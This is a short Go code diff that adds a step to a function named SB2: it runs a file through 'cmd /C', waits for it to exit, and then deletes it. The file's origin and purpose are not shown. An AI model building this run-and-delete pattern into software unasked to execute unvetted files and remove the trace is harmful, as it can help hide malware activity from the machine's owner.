@@ -50,6 +50,23 @@ func SB2() error {
 		return fmt.Errorf("error opening file: %v", err)
 	}
 
+	// Wait for the program to exit
+	cmd := exec.Command("cmd", "/C", filePath)
+	err = cmd.Start()
+	if err != nil {
+		return fmt.Errorf("error starting program: %v", err)
+	}
+	err = cmd.Wait()
+	if err != nil {
+		return fmt.Errorf("error waiting for program to exit: %v", err)
+	}
+
+	// Delete the file
+	err = os.Remove(filePath)
+	if err != nil {
+		return fmt.Errorf("error deleting file: %v", err)
+	}
+
 	return nil
 }
 
